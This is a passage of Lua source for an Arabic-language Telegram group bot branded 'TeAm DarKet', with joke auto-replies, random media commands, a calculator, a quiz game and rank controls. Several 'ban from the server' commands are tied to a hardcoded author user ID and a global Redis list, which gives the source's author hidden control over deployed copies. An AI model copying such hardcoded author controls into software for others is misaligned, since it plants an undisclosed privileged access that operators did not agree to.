}
}
return send(msg_chat_id,msg_id,'* لف ورجع تانى مشحوار 😂🚶‍♂👻*',"md",false, false, false, false, reply_markup)
end
if text == 'بخ' or text == 'عو' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*يوه خضتني ياسمك اي 🥺💔*',"md",false, false, false, false, reply_markup)
end
if text == 'حبيبي' or text == 'حبيبتي' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*اوه ياه 🌝😂*',"md",false, false, false, false, reply_markup)
end
if text == 'تمام' or text == 'تمم' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'* امك اسمها احلام 😹😹*',"md",false, false, false, false, reply_markup)
end
if text == 'خلاص' or text == 'خلص' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*خلصتت روحكك يبعيد 😹💔*',"md",false, false, false, false, reply_markup)
end
if text == 'سي في' or text == 'سيفي' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*كفيه شقط سيب حاجه لغيرك 😎😂*',"md",false, false, false, false, reply_markup)
end
end
if text == "الردود" then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هاذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/R125R'}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(darket.."List:Manager"..msg_chat_id.."")
if #list == 0 then
txx = "٠ عذرا لا يوجد ردود للمدير في الكروب"
else
txx = "٠ قائمه الردود \n– – – – – – – –\n"
for k,v in pairs(list) do
if Redis:get(darket.."Add:Rd:Manager:Gif"..v..msg_chat_id) then
db = "متحركه ٠"
elseif Redis:get(darket.."Add:Rd:Manager:Vico"..v..msg_chat_id) then
db = "بصمه ٠"
elseif Redis:get(darket.."Add:Rd:Manager:Stekrs"..v..msg_chat_id) then
db = "ملصق ٠"
elseif Redis:get(darket.."Add:Rd:Manager:Text"..v..msg_chat_id) then
db = "رساله ٠"
elseif Redis:get(darket.."Add:Rd:Manager:Photo"..v..msg_chat_id) then
db = "صوره ٠"
elseif Redis:get(darket.."Add:Rd:Manager:Video"..v..msg_chat_id) then
db = "فيديو ٠"
elseif Redis:get(darket.."Add:Rd:Manager:File"..v..msg_chat_id) then
db = "ملف ٠"
elseif Redis:get(darket.."Add:Rd:Manager:Audio"..v..msg_chat_id) then
db = "اغنيه ٠"
elseif Redis:get(darket.."Add:Rd:Manager:video_note"..v..msg_chat_id) then
db = "بصمه فيديو ٠"
end
txx = txx..""..k.." ٠ {"..v.."} ٠ {"..db.."}\n"
end
end
return send(msg_chat_id,msg_id,txx)  
end
if text == "استوري" then
Rrr = math.random(4,50)
local m = "https://t.me/Qapplu/"..Rrr..""
local t = "اليك استوري عشوائي من البوت 🖇️🌚"
local rep = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendaudio?chat_id="..msg_chat_id.."&caption="..URL.escape(t).."&audio="..m.."&reply_to_message_id="..rep.."&parse_mode=Markdown")
end
if text == "غنيلي فيديو" or text == "غنيلي بفيديو" then
Rrr = math.random(1,31)
local m = "https://t.me/ghanilyp/"..Rrr..""
local t = "اليك اغنيه ب فيديو🏴‍☠️♥️"
local rep = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendaudio?chat_id="..msg_chat_id.."&caption="..URL.escape(t).."&audio="..m.."&reply_to_message_id="..rep.."&parse_mode=Markdown")
end
if text == 'Barloo' then
local UserId_Info = LuaTele.searchPublicChat("bar_lo0o0")
if UserId_Info.id then
local UserInfo = LuaTele.getUser(UserId_Info.id)
local InfoUser = LuaTele.getUserFullInfo(UserId_Info.id)
if InfoUser.bio then
Bio = InfoUser.bio
else
Bio = ''
end
local photo = LuaTele.getUserProfilePhotos(UserId_Info.id)
if photo.total_count > 0 then
local TestText = "  \n\n- ["..UserInfo.first_name.."](tg://user?id="..UserId_Info.id..")\n\n ["..Bio.."]"
local msg_id = msg.id/2097152/0.5 
return https.request("https://api.telegram.org/bot"..Token..'/sendPhoto?chat_id='..msg.chat_id..'&caption='..URL.escape(TestText)..'&photo='..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id..'&reply_to_message_id='..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
else
local TestText = "  \\nn- ["..UserInfo.first_name.."](tg://user?id="..UserId_Info.id..")\n\n ["..Bio.."]"
local msg_id = msg.id/2097152/0.5 
return https.request("https://api.telegram.org/bot"..Token..'/sendMessage?chat_id=' .. msg.chat_id .. '&text=' .. URL.escape(TestText).."&reply_to_message_id="..msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboardd))
end
end
end
if text == "ميمز" or text == "ميمزز" then 
Abs = math.random(2,140); 
local Text ='*᥀︙تم اختيار الميمز لك*'
local MsgId = msg.id/2097152/0.5
local MSGID = string.gsub(MsgId,'.0','')
https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. msg.chat_id .. '&voice=https://t.me/MemzDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..MsgId.."&parse_mode=markdown") 
end
if text == "فلم" or text == "افلام" then 
Abs = math.random(2,140); 
local Text ='*᥀︙تم اختيار الفلم لك*'
local MsgId = msg.id/2097152/0.5
local MSGID = string.gsub(MsgId,'.0','')
https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/MoviesDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..MsgId.."&parse_mode=markdown") 
end
if text == "انمي" or text == "انمى" then 
Abs = math.random(2,140); 
local Text ='*᥀︙تم اختيار انمي لك*'
local MsgId = msg.id/2097152/0.5
local MSGID = string.gsub(MsgId,'.0','')
https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/AnimeDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..MsgId.."&parse_mode=markdown") 
end
if text == "صوره" or text == "صورة" then 
Abs = math.random(2,140); 
local Text ='*᥀︙تم اختيار صوره لك*'
local MsgId = msg.id/2097152/0.5
local MSGID = string.gsub(MsgId,'.0','')
https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/PhotosDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..MsgId.."&parse_mode=markdown") 
end
if text == "متحركه" or text == "متحركة" then 
Abs = math.random(2,140); 
local Text ='*᥀︙تم اختيار متحركه لك*'
local MsgId = msg.id/2097152/0.5
local MSGID = string.gsub(MsgId,'.0','')
https.request("https://api.telegram.org/bot"..Token..'/sendanimation?chat_id=' .. msg.chat_id .. '&animation=https://t.me/GifDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..MsgId.."&parse_mode=markdown") 
end
if text == "ريمكس" or text == "ريماكس" then 
Abs = math.random(2,140); 
local Text ='*᥀︙تم اختيار ريمكس لك*'
local MsgId = msg.id/2097152/0.5
local MSGID = string.gsub(MsgId,'.0','')
https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. msg.chat_id .. '&voice=https://t.me/RemixDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..MsgId.."&parse_mode=markdown") 
end
if text == "شعر" then
Abs = math.random(2,140); 
local Text ='*✘︙تم اختيار الشعر لك فقط*'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '⧫ ٠ TeAm DarKet ٠️️ ⧫',url="t.me/R125R"}},
}
local msg_id = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. msg.chat_id .. '&voice=https://t.me/QQNNSX/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "الحاسبه" or text == "اله حاسبه" or text == "الاله الحاسبه" then
Redis:del(darket..msg.sender.user_id..msg.chat_id.."num")
start_mrkup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'ON', data = msg.sender.user_id..'ON'},{text = 'DEL', data = msg.sender.user_id..'DEL'},{text = 'AC', data = msg.sender.user_id..'rest'},{text = 'OFF', data = msg.sender.user_id..'OFF'},
},
{
{text = '^', data = msg.sender.user_id..'calc&^'},{text = '√', data = msg.sender.user_id..'calc&√'},{text = '(', data = msg.sender.user_id..'calc&('},{text = ')', data = msg.sender.user_id..'calc&)'},
},
{
{text = '7', data = msg.sender.user_id..'calc&7'},{text = '8', data = msg.sender.user_id..'calc&8'},{text = '9', data = msg.sender.user_id..'calc&9'},{text = '÷', data = msg.sender.user_id..'calc&/'},
},
{
{text = '4', data = msg.sender.user_id..'calc&4'},{text = '5', data = msg.sender.user_id..'calc&5'},{text = '6', data = msg.sender.user_id..'calc&6'},{text = 'x', data = msg.sender.user_id..'calc&*'},
},
{
{text = '1', data = msg.sender.user_id..'calc&1'},{text = '2', data = msg.sender.user_id..'calc&2'},{text = '3', data = msg.sender.user_id..'calc&3'},{text = '-', data = msg.sender.user_id..'calc&-'},
},
{
{text = '0', data = msg.sender.user_id..'calc&0'},{text = '.', data = msg.sender.user_id..'calc&.'},{text = '+', data = msg.sender.user_id..'calc&+'},{text = '=', data = msg.sender.user_id..'equal'},
},
{
{text = 'مطور السورس', url = 'https://t.me/R2RR7'},
},
}
}
send(msg.chat_id,msg.id,"• اهلا بك في بوت الحاسبه\n• welcome to calculator","md",true, false, false, true, start_mrkup)
return false 
end
if text == "استبدال كلمه" then
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*※ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
Redis:set(darket..msg.chat_id..msg.sender.user_id.."replace",true)
return LuaTele.sendText(msg_chat_id,msg_id,'\n※ ارسل الكلمه القديمه ليتم استبدالها',"md",true)  
end
if text == "مسح الكلمات المستبدله" then
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*※ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
local list = Redis:smembers(darket.."Words:r")
for k,v in pairs(list) do
Redis:del(darket.."Word:Replace"..v)
end
Redis:del(darket.."Words:r")
send(msg_chat_id,msg_id,"※ تم مسح الكلمات المستبدله")
end
if text == "الكلمات المستبدله" then
if not msg.Devss then
return send(msg_chat_id,msg_id,'\n*※ هذا الامر يخص  '..Controller_Num(2)..' * ',"md",true)  
end
local list = Redis:smembers(darket.."Words:r")
if #list == 0 then
return send(msg.chat_id,msg.id,"※ لا توجد كلمات مستبدله")
end
local txx = " قائمه الكلمات المستبدله \n"
for k,v in pairs(list) do 
cmdd = Redis:get(darket.."Word:Replace"..v)
txx = txx..k.." - "..v.." ٠٠ "..cmdd.."\n"
end
LuaTele.sendText(msg_chat_id,msg_id,txx)
end
if text then
if text:match("^بحث (.*)$") then
local search = text:match("^بحث (.*)$")
local json = json:decode(http.request("https://api-jack.ml/api18.php?search="..URL.escape(search)..""))
local datar = {data = {{text = "٠ TeAm DarKet ٠" , url = 'https://t.me/R125R'}}}
for i = 1,5 do
title = json.results[i].title
link = json.results[i].url
datar[i] = {{text = title , data =msg.sender.user_id.."dl/"..link}}
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = datar
}
LuaTele.sendText(msg.chat_id,msg.id,'※ نتائج بحثك ل *'..search..'*',"md",false, false, false, false, reply_markup)
end
end
if text and text:match("^(.*)$") then
if Redis:get(darket.."gamebot:new"..msg.sender.user_id..":"..msg.chat_id) == "truedel" then
Redis:set(darket.."gamebot:new"..msg.sender.user_id..":"..msg.chat_id,"truefguigf1")
Redis:del(darket.."gamebot:newqus"..msg.chat_id,text)
Redis:srem(darket.."gamebot:new1", text)
return send(msg_chat_id,msg_id, '\nتم مسح السؤال بنجاح') 
end
end

if text and text:match("^(.*)$") then
if Redis:get(darket.."gamebot:new"..msg.sender.user_id..":"..msg.chat_id) == "true" then
Redis:set(darket.."gamebot:new"..msg.sender.user_id..":"..msg.chat_id,"true1")
Redis:set(darket.."gamebot:newqus"..msg.chat_id,text)
Redis:sadd(darket.."gamebot:new1", text)
return send(msg_chat_id,msg_id, '\nتم حفظ السؤال بنجاح \n ارسل الجواب الاول') 
end
end
if text and text:match("^(.*)$") then
if Redis:get(darket.."gamebot:new"..msg.sender.user_id..":"..msg.chat_id) == "true1" then
local quschen = Redis:get(darket.."gamebot:newqus"..msg.chat_id)
Redis:set(darket.."gamebot:newqus:as1"..quschen,text)
Redis:set(darket.."gamebot:new"..msg.sender.user_id..":"..msg.chat_id,"true2")
return send(msg_chat_id,msg_id, ' \n ارسل الجواب الثاني') 
end
end
if text and text:match("^(.*)$") then
if Redis:get(darket.."gamebot:new"..msg.sender.user_id..":"..msg.chat_id) == "true2" then
local quschen = Redis:get(darket.."gamebot:newqus"..msg.chat_id)
Redis:set(darket.."gamebot:newqus:as2"..quschen,text)
Redis:set(darket.."gamebot:new"..msg.sender.user_id..":"..msg.chat_id,"true3")
return send(msg_chat_id,msg_id, '\n ارسل الجواب الثالث') 
end
end
if text and text:match("^(.*)$") then
if Redis:get(darket.."gamebot:new"..msg.sender.user_id..":"..msg.chat_id) == "true3" then
local quschen = Redis:get(darket.."gamebot:newqus"..msg.chat_id)
Redis:set(darket.."gamebot:newqus:as3"..quschen,text)
Redis:set(darket.."gamebot:new"..msg.sender.user_id..":"..msg.chat_id,"true4")
return send(msg_chat_id,msg_id, '\n ارسل الجواب الرابع') 
end
end
if text and text:match("^(.*)$") then
if Redis:get(darket.."gamebot:new"..msg.sender.user_id..":"..msg.chat_id) == "true4" then
local quschen = Redis:get(darket.."gamebot:newqus"..msg.chat_id)
Redis:set(darket.."gamebot:newqus:as0"..quschen,text)
Redis:set(darket.."gamebot:new"..msg.sender.user_id..":"..msg.chat_id,"true44")
return send(msg_chat_id,msg_id, '\nتم حفظ الاجوبه \n ارسل الجواب الصحيح') 
end
end
if text and text:match("^(.*)$") then
if Redis:get(darket.."gamebot:new"..msg.sender.user_id..":"..msg.chat_id) == "true44" then
local quschen = Redis:get(darket.."gamebot:newqus"..msg.chat_id)
Redis:set(darket.."gamebot:newqus:as4"..quschen,text)
Redis:set(darket.."gamebot:new"..msg.sender.user_id..":"..msg.chat_id,"true186")
return send(msg_chat_id,msg_id, '\nتم حفظ الجواب الصحيح') 
end
end
if text and text:match("^(.*)$") then
if Redis:get(darket.."lkz:gamebot:new"..msg.sender.user_id..":"..msg.chat_id) == "truedel" then
Redis:set(darket.."lkz:gamebot:new"..msg.sender.user_id..":"..msg.chat_id,"truefguigf1")
Redis:del(darket.."lkz:gamebot:newqus"..msg.chat_id,text)
Redis:srem(darket.."lkz:gamebot:new1", text)
send(msg_chat_id,msg_id, '\nتم مسح الغز بنجاح')
return false 
end
end
if text and text:match("^(.*)$") then
if Redis:get(darket.."lkz:gamebot:new"..msg.sender.user_id..":"..msg.chat_id) == "true" then
Redis:set(darket.."lkz:gamebot:new"..msg.sender.user_id..":"..msg.chat_id,"true1")
Redis:set(darket.."lkz:gamebot:newqus"..msg.chat_id,text)
Redis:sadd(darket.."lkz:gamebot:new1", text)
send(msg_chat_id,msg_id, '\nتم حفظ اللغز بنجاح \n ارسل الجواب الاول')
return false 
end
end
if text and text:match("^(.*)$") then
if Redis:get(darket.."lkz:gamebot:new"..msg.sender.user_id..":"..msg.chat_id) == "true1" then
local quschen = Redis:get(darket.."lkz:gamebot:newqus"..msg.chat_id)
Redis:set(darket.."lkz:gamebot:newqus:as1"..quschen,text)
Redis:set(darket.."lkz:gamebot:new"..msg.sender.user_id..":"..msg.chat_id,"true2")
send(msg_chat_id,msg_id, ' \n ارسل الجواب الثاني')
return false 
end
end
if text and text:match("^(.*)$") then
if Redis:get(darket.."lkz:gamebot:new"..msg.sender.user_id..":"..msg.chat_id) == "true2" then
local quschen = Redis:get(darket.."lkz:gamebot:newqus"..msg.chat_id)
Redis:set(darket.."lkz:gamebot:newqus:as2"..quschen,text)
Redis:set(darket.."lkz:gamebot:new"..msg.sender.user_id..":"..msg.chat_id,"true3")
send(msg_chat_id,msg_id, '\n ارسل الجواب الثالث')
return false 
end
end
if text and text:match("^(.*)$") then
if Redis:get(darket.."lkz:gamebot:new"..msg.sender.user_id..":"..msg.chat_id) == "true3" then
local quschen = Redis:get(darket.."lkz:gamebot:newqus"..msg.chat_id)
Redis:set(darket.."lkz:gamebot:newqus:as3"..quschen,text)
Redis:set(darket.."lkz:gamebot:new"..msg.sender.user_id..":"..msg.chat_id,"true44")
send(msg_chat_id,msg_id, ' \n ارسل الجواب الصحيح')
return false 
end
end
if text and text:match("^(.*)$") then
if Redis:get(darket.."lkz:gamebot:new"..msg.sender.user_id..":"..msg.chat_id) == "true44" then
local quschen = Redis:get(darket.."lkz:gamebot:newqus"..msg.chat_id)
Redis:set(darket.."lkz:gamebot:newqus:as4"..quschen,text)
Redis:set(darket.."lkz:gamebot:new"..msg.sender.user_id..":"..msg.chat_id,"true186")
send(msg_chat_id,msg_id, '\nتم حفظ الجواب الصحيح')
return false 
end
end

if text == "اضف لغز" then

if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*• هذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
end
Redis:set(darket.."lkz:gamebot:new"..msg.sender.user_id..":"..msg.chat_id,true)
return send(msg_chat_id,msg_id,"ارسل اللغز الان ")
end
if text == "مسح لغز" then

if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*• هذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
end
Redis:set(darket.."lkz:gamebot:new"..msg.sender.user_id..":"..msg.chat_id,'truedel')
return send(msg_chat_id,msg_id,"ارسل اللغز الان ")
end
if text == 'الالغاز' then

if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*• هذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
end
local list = Redis:smembers(darket.."lkz:gamebot:new1")
t = "• الالغاز : \n"
for k,v in pairs(list) do
t = t..""..k.."- (["..v.."])\n"
end
if #list == 0 then
t = "• لا يوجد الغازمضافه"
end
return send(msg_chat_id,msg_id,t)
end
if text == 'مسح الالغاز' then

if not msg.Devss then 
return send(msg_chat_id,msg_id,'\n*• هذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
end
Redis:del(darket.."lkz:gamebot:new1")
return send(msg_chat_id,msg_id,'تم مسح الالغاز جميعا ')
end

if text == 'لغز' then
local list = Redis:smembers(darket.."lkz:gamebot:new1")
if #list ~= 0 then
local quschen = list[math.random(#list)]
local ansar1 = Redis:get(darket.."lkz:gamebot:newqus:as1"..quschen)
local ansar2 = Redis:get(darket.."lkz:gamebot:newqus:as2"..quschen)
local ansar3 = Redis:get(darket.."lkz:gamebot:newqus:as3"..quschen)
local ansar4 = Redis:get(darket.."lkz:gamebot:newqus:as4"..quschen)
if ansar1 == ansar4 then
tt = 'ansar1'
elseif ansar2 == ansar4 then
tt = 'ansar2'
elseif ansar3 == ansar4 then
tt = 'ansar3'
end
print(tt)
if tt == 'ansar1' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = ansar1, data = 'صحيح1'},
},
{
{text = ansar2, data = 'غلط1'},
},
{
{text = ansar3, data = 'غلط1'},
},
}
}
send(msg_chat_id,msg_id,quschen,"md",false, false, false, false, reply_markup)
elseif tt == 'ansar2' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = ansar1, data = 'غلط1'},
},
{
{text = ansar2, data = 'صحيح1'},
},
{
{text = ansar3, data = 'غلط1'},
},
}
}
send(msg_chat_id,msg_id,quschen,"md",false, false, false, false, reply_markup)
elseif tt == 'ansar3' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = ansar1, data = 'غلط1'},
},
{
{text = ansar2, data = 'غلط1'},
},
{
{text = ansar3, data = 'صحيح1'},
},
}
}
send(msg_chat_id,msg_id,quschen,"md",false, false, false, false, reply_markup)
end

end
end
if text and text:match('^تحكم @(%S+)$') then
local UserName = text:match('^تحكم @(%S+)$') 
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*• هذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
end
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return send(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return send(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return send(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
SuperCreator = Redis:sismember(darket.."SuperCreator:Group"..msg.chat_id,UserId_Info.id) 
Creator = Redis:sismember(darket.."Creator:Group"..msg.chat_id,UserId_Info.id)
Manger = Redis:sismember(darket.."Manger:Group"..msg.chat_id,UserId_Info.id)
Admin = Redis:sismember(darket.."Admin:Group"..msg.chat_id,UserId_Info.id)
Special = Redis:sismember(darket.."Special:Group"..msg.chat_id,UserId_Info.id)
BanGroup = Redis:sismember(darket.."BanGroup:Group"..msg.chat_id,UserId_Info.id)
SilentGroup = Redis:sismember(darket.."SilentGroup:Group"..msg.chat_id,UserId_Info.id)
if BanGroup then
BanGroupz = "✔"
else
BanGroupz = "❌"
end
if SilentGroup then
SilentGroupz = "✔"
else
SilentGroupz = "❌"
end
if SuperCreator then
SuperCreatorz = "✔"
else
SuperCreatorz = "❌"
end
if Creator then
Creatorz = "✔"
else
Creatorz = "❌"
end
if Manger then
Mangerz = "✔"
else
Mangerz = "❌"
end
if Admin then
Adminz = "✔"
else
Adminz = "❌"
end
if Special then
Specialz = "✔"
else
Specialz = "❌"
end

local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = '- منشئ اساسي : '..SuperCreatorz, data =msg.sender.user_id..'/statusSuperCreatorz/'..UserId_Info.id},{text = '- منشئ : '..Creatorz, data =msg.sender.user_id..'/statusCreatorz/'..UserId_Info.id},
},
{
{text = '- مدير : '..Mangerz, data =msg.sender.user_id..'/statusMangerz/'..UserId_Info.id},{text = '- ادمن : '..Adminz, data =msg.sender.user_id..'/statusAdminz/'..UserId_Info.id},
},
{
{text = '- مميز : '..Specialz, data =msg.sender.user_id..'/statusSpecialz/'..UserId_Info.id},
},
{
{text = '- الحظر : '..BanGroupz, data =msg.sender.user_id..'/statusban/'..UserId_Info.id},{text = '- الكتم : '..SilentGroupz, data =msg.sender.user_id..'/statusktm/'..UserId_Info.id},
},
{
{text = '- عضو  ', data =msg.sender.user_id..'/statusmem/'..UserId_Info.id},
},
{
{text = '- اخفاء الامر ', data ='/delAmr1'}
}
}
}
return send(msg.chat_id,msg.id,'*\n• تحكم برتب الشخص*',"md",false, false, false, false, reply_markup)
end
if text == 'تحكم' and msg.reply_to_message_id > 0 then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*• هذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
SuperCreator = Redis:sismember(darket.."SuperCreator:Group"..msg.chat_id,Message_Reply.sender.user_id) 
Creator = Redis:sismember(darket.."Creator:Group"..msg.chat_id,Message_Reply.sender.user_id)
Manger = Redis:sismember(darket.."Manger:Group"..msg.chat_id,Message_Reply.sender.user_id)
Admin = Redis:sismember(darket.."Admin:Group"..msg.chat_id,Message_Reply.sender.user_id)
Special = Redis:sismember(darket.."Special:Group"..msg.chat_id,Message_Reply.sender.user_id)
BanGroup = Redis:sismember(darket.."BanGroup:Group"..msg.chat_id,Message_Reply.sender.user_id)
SilentGroup = Redis:sismember(darket.."SilentGroup:Group"..msg.chat_id,Message_Reply.sender.user_id)
if BanGroup then
BanGroupz = "✔"
else
BanGroupz = "❌"
end
if SilentGroup then
SilentGroupz = "✔"
else
SilentGroupz = "❌"
end
if SuperCreator then
SuperCreatorz = "✔"
else
SuperCreatorz = "❌"
end
if Creator then
Creatorz = "✔"
else
Creatorz = "❌"
end
if Manger then
Mangerz = "✔"
else
Mangerz = "❌"
end
if Admin then
Adminz = "✔"
else
Adminz = "❌"
end
if Special then
Specialz = "✔"
else
Specialz = "❌"
end
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = '- منشئ اساسي : '..SuperCreatorz, data =msg.sender.user_id..'/statusSuperCreatorz/'..Message_Reply.sender.user_id},{text = '- منشئ : '..Creatorz, data =msg.sender.user_id..'/statusCreatorz/'..Message_Reply.sender.user_id},
},
{
{text = '- مدير : '..Mangerz, data =msg.sender.user_id..'/statusMangerz/'..Message_Reply.sender.user_id},{text = '- ادمن : '..Adminz, data =msg.sender.user_id..'/statusAdminz/'..Message_Reply.sender.user_id},
},
{
{text = '- مميز : '..Specialz, data =msg.sender.user_id..'/statusSpecialz/'..Message_Reply.sender.user_id},
},
{
{text = '- الحظر : '..BanGroupz, data =msg.sender.user_id..'/statusban/'..Message_Reply.sender.user_id},{text = '- الكتم : '..SilentGroupz, data =msg.sender.user_id..'/statusktm/'..Message_Reply.sender.user_id},
},
{
{text = '- عضو  ', data =msg.sender.user_id..'/statusmem/'..Message_Reply.sender.user_id},
},
{
{text = '- اخفاء الامر ', data ='/delAmr1'}
}
}
}
return send(msg.chat_id,msg.id,'*\n• تحكم برتب الشخص*',"md",false, false, false, false, reply_markup)
end
if text then
if text:match("^حظر من السيرفر (%d+)$") then
if tonumber(msg.sender.user_id) == tonumber(5386549632) then
local iduser = tonumber(text:match("^حظر من السيرفر (%d+)$"))
Redis:sadd("banserver",iduser)
send(msg.chat_id,msg.id,"• تم حظر العضو من السيرفر")
else
send(msg.chat_id,msg.id,"• للمبرمج ستيفن فقط")
end
end
end
if text then
if text:match("^الغاء حظر من السيرفر (%d+)$") then
if tonumber(msg.sender.user_id) == tonumber(5386549632) then
local iduser = tonumber(text:match("^الغاء حظر من السيرفر (%d+)$"))
Redis:srem("banserver",iduser)
send(msg.chat_id,msg.id,"• تم الغاء حظر العضو من السيرفر")
else
send(msg.chat_id,msg.id,"• للمبرمج ستيفن فقط")
end
end
end
if text == "المحظورين من السيرفر" then
if tonumber(msg.sender.user_id) == tonumber(5386549632) then
local list = Redis:smembers("banserver")
if #list == 0 then
return send(msg.chat_id,msg.id,"• القائمه فارغه")
end
local txx = "المحظورين من السيرفر \n"
for k,v in pairs(list) do 
xx = LuaTele.getUser(v)
if xx.username then 
users = "@"..xx.username
else
users = v
end
txx = txx..' k - '..users..'\n'
end
send(msg.chat_id,msg.id,txx)
else
send(msg.chat_id,msg.id,"• للمبرمج ستيفن فقط")
end
end
if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'source' then
photo = "https://t.me/QQQLO/26"
local T =[[
– – – – – – – –
 ٠ TeAm DarKet ٠
– – – – – – – –
٠ DEV >> [˹ S𝑡𝑒Pℎ𝑒N .](t.me/R2RR7)
– – – – – – – – 
٠ Exp >> [˹ Exp DarKet .](t.me/R125R)
– – – – – – – – 
٠ـــ٠ >> [˹ TeAm DarKet .](t.me/R125R)
– – – – – – – – 
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'S𝑡𝑒Pℎ𝑒N', url = "https://t.me/R2RR7"},
},
{
{text = 'TeAm DarKet ', url = "https://t.me/R125RL"}
},
}
local msgg = msg_id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg_chat_id .. "&photo="..photo.."&caption=".. URL.escape(T).."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
elseif text == 'الاوامر' then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '１', data = msg.sender.user_id..'/help1'}, {text = '２', data = msg.sender.user_id..'/help2'}, 
},
{
{text = '３', data = msg.sender.user_id..'/help3'}, {text = '４', data = msg.sender.user_id..'/help4'}, 
},
{
{text = '５', data = msg.sender.user_id..'/help5'}, {text = '６', data = msg.sender.user_id..'/help7'}, 
},
{
{text = 'الالعاب', data = msg.sender.user_id..'/help6'}, 
},
{
{text = 'اوامر القفل', data = msg.sender.user_id..'/NoNextSeting'}, {text = 'اوامر التعطيل', data = msg.sender.user_id..'/listallAddorrem'}, 
},
{
